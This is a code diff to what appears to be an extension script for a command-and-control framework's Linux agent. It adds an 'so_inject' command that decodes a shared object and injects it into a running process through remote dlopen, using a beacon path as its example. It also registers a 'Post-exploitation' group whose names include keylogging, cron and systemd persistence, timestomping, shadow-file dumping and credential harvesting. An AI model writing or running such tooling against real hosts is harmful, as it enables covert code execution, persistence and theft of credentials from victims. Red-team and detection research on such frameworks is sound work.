@@ -286,6 +286,24 @@ cmd_recon_lb.setPreHook(function (id, cmdline, parsed_json) {
     ax.execute_alias(id, cmdline, `bof "${bof_path}" ${bof_params}`, "BOF: recon_lb");
 });
 
+// so_inject
+var so_inject = ax.create_command("so_inject", "Inject a .so into a running process via remote dlopen", "so_inject 102411 libcs.so /tmp/beacons/nax_linux_x64.so");
+so_inject.addArgInt("PID", true, "Process PID");
+so_inject.addArgString("memname", true, "memname");
+so_inject.addArgFile("path", true, "Path to ELF");
+so_inject.setPreHook(function (id, cmdline, parsed_json) {
 
-var group_commands = ax.create_commands_group("Post-exploitation", [cmd_recon_lb, cmd_mv, load_elf, cmd_chown, cmd_chmod, cmd_df, cmd_persist_systemd, cmd_uptime, cmd_persist_cron, cmd_klist, cmd_keylog_start, cmd_keylog_dump, cmd_timestomp, cmd_portscan, cmd_nslookup, cmd_suid_scan, cmd_arp, cmd_sudo_check, cmd_ssh_keys, cmd_shadow_dump,cmd_service_enum, cmd_proc_enum, cmd_net_enum, cmd_ld_preload_check, cmd_kernel_exploit_check, cmd_host_recon, cmd_cred_harvest, cmd_container_detect]);
+    let PID = parsed_json["PID"] || "";
+    let memname = parsed_json["memname"] || "";
+    let so_b64 = parsed_json["path"] || "";
+
+    let so_raw = ax.decode_data("base64", so_b64);
+    let bof_params = ax.bof_pack("int,cstr,bytes", [PID, memname, so_raw]);
+
+    let bof_path = ax.script_dir() + "bofs_compile/so_inject." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, `bof_async "${bof_path}" ${bof_params}`, "BOF: so_inject");
+});
+
+
+var group_commands = ax.create_commands_group("Post-exploitation", [so_inject, cmd_recon_lb, cmd_mv, load_elf, cmd_chown, cmd_chmod, cmd_df, cmd_persist_systemd, cmd_uptime, cmd_persist_cron, cmd_klist, cmd_keylog_start, cmd_keylog_dump, cmd_timestomp, cmd_portscan, cmd_nslookup, cmd_suid_scan, cmd_arp, cmd_sudo_check, cmd_ssh_keys, cmd_shadow_dump,cmd_service_enum, cmd_proc_enum, cmd_net_enum, cmd_ld_preload_check, cmd_kernel_exploit_check, cmd_host_recon, cmd_cred_harvest, cmd_container_detect]);
 ax.register_commands_group(group_commands, ["NaxDarks"], ["linux"], []);
